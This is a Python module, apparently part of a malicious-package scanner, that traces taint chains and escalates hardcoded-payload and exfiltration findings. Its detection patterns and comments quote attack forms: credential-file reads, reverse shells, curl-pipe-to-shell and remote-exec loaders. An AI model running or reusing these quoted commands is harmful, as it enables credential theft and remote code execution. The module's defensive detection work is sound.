# -*- coding: utf-8 -*-
"""污点引擎 - 在 DDG 子图上做真实的 Source→Sink 反向追踪

动机（2026-10 图内核重构）：此前喂给 LLM 的"数据流路径"是每条边生成一个
二元组（from/to 各一带 code），中间节点丢失，LLM 看到的不是攻击链而是碎片。
本模块在子图的节点/边上做真正的反向 BFS：从 Sink 出发沿 def→use 边回溯，
到达 Source 即产出一条完整污点链。

设计约束：
- 输入是子图 JSON 的 nodes/edges（与 _read_subgraph_jsons 的产物同构），不依赖
  builder 内部结构，可独立测试。
- 正则匹配限长（节点 code 截 500 字符已足够），无灾难性回溯模式。
- 链与步数都有上限，大子图（百节点级）耗时毫秒级。
"""

import re
from collections import deque
from typing import Dict, List, Optional, Set

# 数据进入点（不可信来源）
SOURCE_PATTERNS = [
    # 2026-11 凭据文件是强源（ssc-concurrent-log-handler：
    # open(~/.kube/config) + open(~/.ssh/id_rsa) → base64 → curl POST）
    (r'\.ssh/|id_rsa|\.aws/credentials|\.kube/config|\.netrc'
     r'|\.pypirc|\.docker/config\.json|\.git-credentials'
     r'|\.npmrc|\.config/gcloud', 'credentials'),
    # 路径被 os.path.join 拆开时（真实样本写法）：
    #   os.path.join(home, '.kube', 'config')
    (r'\.kube[^' + chr(10) + r']{0,40}config', 'credentials'),
    (r'\.ssh[^' + chr(10) + r']{0,40}(id_rsa|id_ed25519)', 'credentials'),
    (r'\.aws[^' + chr(10) + r']{0,40}credentials', 'credentials'),
    (r'\bos\.environ\b', 'environment'),
    (r'\bos\.getenv\s*\(', 'environment'),
    (r'\bsys\.argv\b', 'cli_args'),
    (r'(?<![\w.])input\s*\(', 'user_input'),
    (r'(?<![\w.])open\s*\([^)]*[\'"]r', 'file_read'),
    (r'\.read(text|lines|line|bytes)?\s*\(', 'file_read'),
    (r'requests\.(get|post|put|head)\s*\(', 'network_response'),
    (r'\burlopen\s*\(', 'network_response'),
    (r'httpx\.(get|post)\s*\(', 'network_response'),
    (r'\.recv\s*\(', 'socket_recv'),
    (r'\b(pickle|marshal)\.loads\s*\(', 'deserialization'),
    (r'yaml\.load\s*\(', 'deserialization'),
    (r'b64decode\s*\(', 'decoded_data'),
]

# 硬编码高危载荷特征（2026-11）
# 用于识别"常量载荷直接执行"——这类恶意包没有外部输入源，
# source→sink 链永远不成立，必须把载荷本身视为 source。
# 只收录**良性软件几乎不可能出现**的特征，避免误报：
#   - PowerShell EncodedCommand（Windows 恶意软件投递标配）
#   - 下载管道执行（curl|sh / wget|bash）
#   - certutil/bitsadmin 下载（LOLBins）
#   - 隐藏窗口 + 命令执行
HARDCODED_PAYLOAD_PATTERNS = [
    (r'-EncodedCommand', 'powershell_encoded'),
    (r'-e(nc|ncoded)?\s+[A-Za-z0-9+/]{40,}={0,2}', 'powershell_encoded'),
    (r'powershell[^\n]*-(w|WindowStyle)\s+[Hh]idden', 'powershell_hidden'),
    (r'powershell[^\n]*(downloadstring|invoke-webrequest|invoke-expression|iex)', 'powershell_download'),
    (r'(curl|wget)\s+[^\n|]*\|\s*(sh|bash)\b', 'download_pipe_shell'),
    (r'certutil[^\n]*-urlcache', 'lolbin_download'),
    (r'bitsadmin[^\n]*/transfer', 'lolbin_download'),
    (r'/dev/tcp/\d+\.\d+\.\d+\.\d+', 'reverse_shell'),
    (r'socket\.socket\([^)]*\)[^\n]*connect\(', 'reverse_shell'),
    # 2026-11 真实样本补三条（maxpatrol / ctf-q21 家族）
    # ① 动态导入的远程执行：exec(__import__('requests').get(url).text)
    (r'exec\s*\([^\n]{0,160}\.text', 'remote_exec_text'),
    # ② 网络调用 + 裸 IP 字面量（52.246.190.141:1338）
    (r'(requests\.(get|post|put)|urlopen|socket\.connect)[^\n]{0,140}'
     r'\d{1,3}(\.\d{1,3}){3}', 'endpoint_literal'),
]


# 解码后的载荷里出现这些 = 远程加载/执行/外传（编码载荷的恶意判据）
_DECODED_MALICIOUS = (
    (r'urlopen\s*\(', 'remote_fetch'),
    (r'urllib\.(request|urlretrieve)', 'remote_fetch'),
    (r'requests\.(get|post)\s*\(', 'remote_fetch'),
    (r'https?://[^\s' + chr(34) + r']{6,}', 'remote_url'),
    (r'(exec|eval)\s*\(', 'dynamic_exec'),
    (r'__import__\s*\(', 'dynamic_import'),
    (r'subprocess\.|os\.system|popen', 'command_exec'),
    (r'socket\.|/dev/tcp', 'reverse_shell'),
    (r'(curl|wget)\s+[^' + chr(10) + r'|]*\|\s*(sh|bash)', 'download_pipe'),
    (r'stratum\+|supportxmr|pool\.', 'miner'),
)


def _decoded_payload_kind(code: str) -> str:
    """编码载荷检测：解一层，看解出来的内容是不是恶意代码/地址。

    不解执行、不递归爆炸（literal_decoder 内部限 3 层且有大小上限）。
    返回 payload_kind 或 ''。
    """
    if not code or ('base64' not in code and 'b64decode' not in code
                    and 'marshal' not in code and 'fromhex' not in code
                    and 'unhexlify' not in code and not any(
                        c in code for c in ('"', "'"))):
        return ''
    try:
        from src.literal_decoder import scan_code
        hits = scan_code(code, max_literals=4)
    except Exception:
        return ''
    for h in hits or []:
        dec = h.get('decoded') or ''
        if len(dec) < 20:
            continue
        for pat, kind in _DECODED_MALICIOUS:
            if re.search(pat, dec, re.IGNORECASE):
                return f'encoded_{kind}'
    return ''


# 危险汇聚点
SINK_PATTERNS = [
    (r'(?<![\w.])exec\s*\(', 'code_execution'),
    (r'(?<![\w.])eval\s*\(', 'code_execution'),
    (r'(?<![\w.])compile\s*\(', 'code_execution'),
    (r'\bos\.system\s*\(', 'command_execution'),
    (r'\bos\.popen\s*\(', 'command_execution'),
    (r'\bsubprocess\.\w+\s*\(', 'command_execution'),
    (r'requests\.(post|put)\s*\(', 'data_exfiltration'),
    # GET 也能外传（查询串带数据）。单独一类：只有目标被判定为
    # 攻击设施时才定罪，避免正常 API 客户端误报。
    (r'requests\.(get|head)\s*\(', 'data_exfil_get'),
    (r'\burlopen\s*\([^)]*,', 'data_exfiltration'),
    (r'socket\.(send|sendall|sendto)\s*\(', 'data_exfiltration'),
    (r'smtplib\.', 'data_exfiltration'),
    (r'(?<![\w.])open\s*\([^)]*[\'"]w', 'file_write'),
    (r'\.write\s*\(', 'file_write'),
]

# 主来源归因优先级(模块级常量):越靠前越是"真正的外部来源"。
# decoded_data/deserialization 是变换而非源头——若同一 sink 同时
# 可达 os.environ 与 b64decode，主来源应归因到环境变量。
# 2026-10 提升为模块级:函数摘要等外部消费者也需要。
SOURCE_PRIORITY = {cat: rank for rank, cat in enumerate([
    'environment', 'cli_args', 'user_input', 'network_response',
    'file_read', 'socket_recv', 'deserialization', 'decoded_data',
])}


# ===== SUSPICIOUS 升级门控（2026-11 架构层修复）=====
# 背景：函数级分割后，恶意包几乎必有若干"含危险API的函数"，LLM 逐函数
# 判 SUSPICIOUS，投票层"1可疑→包可疑"使已知恶意语料大量停在 SUSPICIOUS。
# 升级原则：只有"良性软件中罕见"的链形态才允许机器自动升级——
# environment/file_read→exec 是构建工具的日常形态，不参与自动升级
# （仍可由包级 LLM 聚合基于完整上下文升级）。
STRONG_SOURCES = {'network_response', 'socket_recv', 'deserialization',
                  'decoded_data', 'hardcoded_payload', 'credentials'}
EXFIL_SINKS = {'data_exfiltration'}

# 2026-11 升级门收紧（500+500 四个网络客户端误报驱动）：
# 强源必须到达【执行/外传】类 sink 才定罪。colcon-metadata（本职拉取
# 元数据）、pyslack/twirp（API 客户端）的 网络响应→写文件 是**下载器**
# 形态——良性工具每天都在做；dropper 的区别是下载内容最终被**执行**。
# network→file_write 止步 SUSPICIOUS；hardcoded_payload 例外（节点本身
# 含敌意字面量，即单节点证据，不依赖 sink 类别）。
_STRONG_SOURCE_SINKS = {'code_execution', 'command_execution', 'data_exfiltration'}


def escalation_gate(chains: List[Dict], nodes: List[Dict] = None,
                    project_dir=None) -> str:
    """判断污点链集合是否满足 SUSPICIOUS→MALICIOUS 自动升级门控。

    满足条件（良性软件中罕见的形态）:
      1. 强源（网络/套接字/反序列化/解码数据）→ 执行/外传 sink
         （2026-11 收紧：网络→写文件=下载器形态，不再定罪）
      2. 任意源 → 外传 sink（数据流出即窃取模式）
         （2026-11 目标感知：按目的地分层——攻击基础设施定罪，
          包自有服务不定罪。twirp/pyslack/artifactory 误报驱动）
      3. hardcoded_payload 源 → 任意 sink（单节点敌意字面量证据）
    返回升级理由字符串；不满足返回 ''。
    在线投票层与离线重判脚本共用此函数，保证口径一致。
    """
    _ta = None
    if nodes:
        try:
            from src.target_awareness import chain_target
            _ta = chain_target
        except Exception:
            _ta = None
    for c in (chains or []):
        src = c.get('source_category', '')
        sink = c.get('sink_category', '')
        if src == 'hardcoded_payload':
            return f"污点链 敌意载荷[{src}]→[{sink}]"

        # 2026-11 目标感知：先问"流向了谁"——强源/外传两条规则共用
        if _ta is not None and sink in _STRONG_SOURCE_SINKS:
            try:
                cls, ev = _ta(c, nodes or [], project_dir)
                if cls == 'package_own':
                    continue       # 流向包自己的服务：两条规则都不定罪
                if cls == 'attacker_infra' and sink in EXFIL_SINKS:
                    return f"污点链 [{src}]→外传[{sink}]→攻击设施[{ev[:40]}]"
            except Exception:
                pass

        if src in STRONG_SOURCES and sink in _STRONG_SOURCE_SINKS:
            return f"污点链 强源[{src}]→执行/外传[{sink}]"
        if sink in EXFIL_SINKS:
            return f"污点链 [{src}]→外传[{sink}]"
        if sink == 'data_exfil_get':
            # GET 外传只在目标明确是攻击设施时定罪（ctf-q21 的裸 IP 形态）
            if _ta is not None:
                try:
                    cls, ev = _ta(c, nodes or [], project_dir)
                    if cls == 'attacker_infra':
                        return (f"污点链 [{src}]→GET外传→攻击设施[{ev[:40]}]")
                except Exception:
                    pass
            continue
    return ''

_MAX_CHAIN_DEPTH = 12
_MAX_CHAINS = 5
_MATCH_CHARS = 500


def _match(patterns: List, code: str) -> Optional[str]:
    """返回命中的第一个类别名，无命中返回 None"""
    if not code:
        return None
    text = code[:_MATCH_CHARS]
    for pattern, category in patterns:
        if re.search(pattern, text):
            return category
    return None


def analyze(nodes: List[Dict], edges: List[Dict]) -> List[Dict]:
    """在子图上做污点追踪

    Args:
        nodes: [{'node_id','code','line','file','type',...}]
        edges: [{'from_node','to_node',...}]（def→use 方向）

    Returns:
        [{'sink': {...}, 'sink_category': str, 'source': {...},
          'source_category': str, 'steps': [{'stage','node_id','code','file','line'}]}]
    """
    # 2026-11：没有边也要跑——单节点硬编码载荷（dropper/编码载荷）
    # 不依赖任何数据流边。此前 `not edges` 直接返回，导致
    # 0 边的小包（tlsshield/tlsproxies 族）永远拿不到强链。
    if not nodes:
        return []

    node_map = {n.get('node_id'): n for n in nodes if n.get('node_id')}

    # 2026-10 结构尸检：复合语句节点(if/for/def/class)携带完整 body 文本，
    # 一个节点会同时命中 Source 和 Sink（gequests 实测产出 1 步退化链）。
    # 匹配限定在语句/调用级节点上——复合节点只作为传播中间节点。
    _COMPOSITE_TYPES = {'function', 'class', 'if', 'for', 'while', 'try'}

    def _matchable(node: Dict) -> bool:
        return (node.get('type') or '') not in _COMPOSITE_TYPES

    # 正向邻接表 + 反向邻接表 + 边类型表
    # 2026-10 BFS 审计修复:污点传播只走数据类边(data/param/call/return),
    # **排除 control**(true_branch/loop_body/contains)——实测
    # `if flag: os.system('ls')`(sink 参数是字面量)曾产出假的
    # environment→command_execution 链:环境变量只控制"是否执行",
    # 没有任何污点数据到达 sink。控制依赖不是数据依赖。
    reverse_adj: Dict[str, List[str]] = {}
    edge_kind_map: Dict[tuple, str] = {}
    for e in edges:
        src, dst = e.get('from_node'), e.get('to_node')
        if src and dst:
            kind = e.get('kind') or e.get('edge_kind') or 'data'
            if kind == 'control':
                continue
            reverse_adj.setdefault(dst, []).append(src)
            edge_kind_map[(src, dst)] = kind

    # 找 Sink 节点（复合节点不参与匹配,同上）
    # 2026-10 词法天花板攻坚:**resolved_call 优先**——AST 解析出的真实
    # 调用目标(getattr 常量折叠/别名追踪产物)直接查表;正则回退保留。
    # 2026-11 摘要传播:**sink_expansion**——builder 标记的"调用污点
    # 相关函数"的调用点,通过摘要传播 sink-ness,不依赖正则。
    from src.call_resolver import match_resolved_sink, match_resolved_source
    sinks = []
    for n in nodes:
        if not _matchable(n):
            continue
        resolved = n.get('resolved_call')
        category = match_resolved_sink(resolved) if resolved else None
        if not category:
            category = _match(SINK_PATTERNS, n.get('code', '') or '')
        if not category and n.get('sink_expansion'):
            # 摘要传播:调用污点相关函数 → 使用摘要中的 sink 类别
            cats = n.get('taint_categories') or ['code_execution']
            category = cats[0]
        if category:
            sinks.append((n, category))

    chains = []
    seen_chains = set()

    def _is_source(node: Dict) -> Optional[str]:
        if not _matchable(node):
            return None
        resolved = node.get('resolved_call')
        if resolved:
            cat = match_resolved_source(resolved)
            if cat:
                return cat
        return _match(SOURCE_PATTERNS, node.get('code', '') or '')

    # ===== 硬编码载荷：把常量 payload 当作 source（2026-11）=====
    # 污点模型要求 source→sink，但真实恶意包普遍是**常量载荷直接执行**：
    #   subprocess.Popen('powershell -WindowStyle Hidden -EncodedCommand <b64>')
    #   os.system('curl http://x/y | sh')
    # 没有外部输入源，链永远不成立——EsqueleSquad 家族三个包
    # （tppinghttpget/ramtool/libedgui）因此只落到 SUSPICIOUS。
    # 处理：sink 节点若携带高危常量特征，生成一条 [hardcoded_payload]→sink 链。
    # 只匹配强特征（PowerShell EncodedCommand / 下载管道执行 / certutil 等），
    # 普通 base64 字面量不触发，避免误报。
    for sink_node, sink_cat in sinks:
        code = sink_node.get('code', '') or ''
        payload_kind = _match(HARDCODED_PAYLOAD_PATTERNS, code)
        if not payload_kind:
            # 2026-11 编码载荷（requsets 族驱动）：真实形态是
            #   exec(base64.b64decode(b'ZXhlYyhfX2ltcG9ydF9f...'))
            # 载荷是"解出来才是恶意代码"的编码串。之前只匹配明文特征，
            # 于是这批包 LLM 判了恶意却被机械复核以"无结构性证据"降级。
            # 我们已有确定性解码器：解一层，内容命中恶意特征即视为
            # hardcoded_payload（不解执行，只扫文本）。
            payload_kind = _decoded_payload_kind(code)
            if not payload_kind:
                payload_kind = _literal_payload_kind(code)
            if not payload_kind:
                continue
        sink_id = sink_node.get('node_id')
        if not sink_id:
            continue
        chain_key = (sink_id, 'hardcoded_payload')
        if chain_key in seen_chains:
            continue
        seen_chains.add(chain_key)
        chains.append({
            'sink': {'node_id': sink_id,
                     'code': code[:160],
                     'file': sink_node.get('file', ''),
                     'line': sink_node.get('line', 0)},
            'sink_category': sink_cat,
            'source': {'node_id': sink_id,
                       'code': f'<hardcoded {payload_kind} payload>',
                       'file': sink_node.get('file', ''),
                       'line': sink_node.get('line', 0)},
            'source_category': 'hardcoded_payload',
            'steps': [
                {'stage': 'source', 'node_id': sink_id,
                 'code': f'<hardcoded {payload_kind} payload>',
                 'file': sink_node.get('file', ''), 'line': sink_node.get('line', 0),
                 'via': None},
                {'stage': 'sink', 'node_id': sink_id, 'code': code[:160],
                 'file': sink_node.get('file', ''), 'line': sink_node.get('line', 0),
                 'via': 'embedded'},
            ],
            'cross_file': False,
            'confidence': 0.9,
            'payload_kind': payload_kind,
        })

    for sink_node, sink_cat in sinks:
        if len(chains) >= _MAX_CHAINS:
            break
        sink_id = sink_node.get('node_id')
        if not sink_id:
            continue

        # 反向 BFS（主来源归因）：收集全部可达 Source,按优先级取主来源,
        # 平手取路径最长——替代原先"第一个命中即停"的最近来源语义
        #（b64decode 会抢在 os.environ 前面,归因不完整）
        parents = {sink_id: None}
        found_sources = []  # [(source_id, source_cat, depth)]
        queue = deque([(sink_id, 0)])
        while queue:
            cur, depth = queue.popleft()
            cur_node = node_map.get(cur) or {}
            if cur != sink_id:
                cat = _is_source(cur_node)
                if cat:
                    found_sources.append((cur, cat, depth))
            for pred in reverse_adj.get(cur, []):
                if pred not in parents:
                    parents[pred] = cur
                    queue.append((pred, depth + 1))
            if len(parents) > 600:  # 单 sink 搜索上限
                break

        if not found_sources:
            continue

        # 主来源 = 优先级最高；平手取最深(链最长=证据最完整)
        best_source_id, source_cat, _ = max(
            found_sources,
            key=lambda t: (-SOURCE_PRIORITY.get(t[1], 99), t[2]))

        # 重建路径 source → sink（沿 parents 从 source 走到 sink，已是正序）
        path_ids = []
        cur = best_source_id
        while cur is not None:
            path_ids.append(cur)
            cur = parents[cur]

        source_node = node_map.get(best_source_id, {})

        # 去重：同 (source_id, sink_id) 的链只留一条
        key = (best_source_id, sink_id)
        if key in seen_chains:
            continue
        seen_chains.add(key)

        # 截断时保留两端：头部 source 步 + 尾部 sink 步
        if len(path_ids) > _MAX_CHAIN_DEPTH:
            path_ids = path_ids[:_MAX_CHAIN_DEPTH - 1] + [path_ids[-1]]

        steps = []
        path_kinds = set()
        for i, nid in enumerate(path_ids):
            n = node_map.get(nid) or {}
            if nid == sink_id:
                stage = 'sink'
            elif i == 0:
                stage = 'source'
            else:
                stage = 'propagate'
            # 本步的入边类型(2026-10:数据流/调用边区分,LLM 与复核可读)
            via = edge_kind_map.get((path_ids[i - 1], nid)) if i > 0 else None
            if via:
                path_kinds.add(via)
            steps.append({
                'stage': stage,
                'node_id': nid,
                'code': (n.get('code', '') or '')[:160],
                'file': n.get('file', ''),
                'line': n.get('line', 0),
                'via': via,
            })

        # 跨文件标志 + 置信度(纯 data 边=0.9,穿 call/param 边=0.75)
        step_files = {s.get('file', '') for s in steps if s.get('file')}
        cross_file = len(step_files) > 1
        confidence = 0.9 if path_kinds <= {'data', None} else 0.75

        chains.append({
            'sink': {'node_id': sink_id,
                     'code': (sink_node.get('code', '') or '')[:160],
                     'file': sink_node.get('file', ''),
                     'line': sink_node.get('line', 0)},
            'sink_category': sink_cat,
            'source': {'node_id': best_source_id,
                       'code': (source_node.get('code', '') or '')[:160],
                       'file': source_node.get('file', ''),
                       'line': source_node.get('line', 0)},
            'source_category': source_cat,
            'steps': steps,
            'cross_file': cross_file,
            'confidence': confidence,
        })

    return chains


def distribute_chains(chains: List[Dict], node_ids: Set[str],
                      min_hits: int = 1) -> List[Dict]:
    """把全图污点链分发给某个函数块（2026-11 划分越界修复）。

    背景：函数级划分用诱导子图切块，跨函数/跨文件边在落盘时被丢弃，
    子图级 analyze() 只能重建函数内部的链。全图 analyze() 的结果
    （.ddg_output/taint_chains.json）本来就有完整链，只是从没被分发回
    各个块——本函数补上这一步。

    Args:
        chains: 全图 analyze() 的输出
        node_ids: 本块包含的 node_id 集合
        min_hits: 链中至少有几步落在本块内才保留（1 = 只要沾边就给）

    Returns:
        命中的链（原样返回，不改 node_id / steps）
    """
    if not chains or not node_ids:
        return []
    out = []
    for c in chains:
        hits = sum(1 for s in (c.get('steps') or [])
                   if s.get('node_id') in node_ids)
        if hits >= min_hits:
            out.append(c)
    return out


def _chain_sig(c: Dict) -> tuple:
    """链的归一化指纹：来源/汇类别 + 步骤节点序列（用于跨块链与块内链去重）"""
    return (
        c.get('source_category', ''),
        c.get('sink_category', ''),
        tuple(s.get('node_id', '') for s in (c.get('steps') or [])),
    )


def merge_chains(primary: List[Dict], secondary: List[Dict],
                 max_chains: int = 8) -> List[Dict]:
    """合并两组链并去重，优先保留 primary（通常是跨块的全图链）。

    跨块链覆盖多个函数/文件，信息量高于块内链，所以排在前面，
    且在 max_chains 截断时不会被块内链挤掉。
    """
    seen = set()
    out = []
    for c in list(primary or []) + list(secondary or []):
        sig = _chain_sig(c)
        if sig in seen:
            continue
        seen.add(sig)
        out.append(c)
        if len(out) >= max_chains:
            break
    return out



# 明文字面量载荷：tlsshield 族把一个"下载并执行"的脚本作为字符串写盘再运行
#   _ttmp.write(b"...urlopen('https://paste.../raw')...exec(...)")
#   os.system(f"start {python} {tmp}")
# 判据：同一节点里同时出现「远程获取」与「执行」两类 API。
_LITERAL_FETCH_RE = re.compile(
    r'(urlopen|urlretrieve|requests\.(get|post)|httpx\.(get|post)|'
    r'urllib\.request)', re.IGNORECASE)
_LITERAL_EXEC_RE = re.compile(
    r'(exec\s*\(|eval\s*\(|os\.system|subprocess\.|popen\s*\()',
    re.IGNORECASE)


def _literal_payload_kind(code: str) -> str:
    """明文字面量里同时含"下载"和"执行" → 远程执行载荷。"""
    if not code or len(code) > _MATCH_CHARS * 4:
        return ''
    if _LITERAL_FETCH_RE.search(code) and _LITERAL_EXEC_RE.search(code):
        return 'literal_remote_exec'
    return ''


def format_for_prompt(chains: List[Dict], max_chains: int = 4) -> str:
    """把污点链格式化为 LLM prompt 文本（2026-10 硬化：代码消毒后呈现）

    2026-10 结构重构:呈现主来源归因/边类型/跨文件标志/置信度。
    """
    from src.llm_sanitizer import sanitize_code
    if not chains:
        return "No complete taint chain found in this subgraph."
    lines = []
    for i, c in enumerate(chains[:max_chains], 1):
        flags = []
        if c.get('cross_file'):
            flags.append('CROSS-FILE')
        if c.get('confidence') is not None:
            flags.append(f"confidence={c['confidence']}")
        suffix = f" ({', '.join(flags)})" if flags else ''
        lines.append(
            f"Taint Chain {i} [Source: {c['source_category']} -> Sink: {c['sink_category']}]{suffix}:")
        for s in c['steps']:
            icon = {'source': '[SOURCE]', 'sink': '[SINK]', 'propagate': '  -->'}.get(s['stage'], '     ')
            via = f" --{s['via']}-->" if s.get('via') and s['via'] != 'data' else ''
            fname = s['file'].replace('\\', '/').rsplit('/', 1)[-1] if s['file'] else '?'
            code = sanitize_code(s['code'], marker=f"L{s['line']}")
            lines.append(f"  {icon} L{s['line']} in {fname}{via}: {code}")
    return "\n".join(lines)
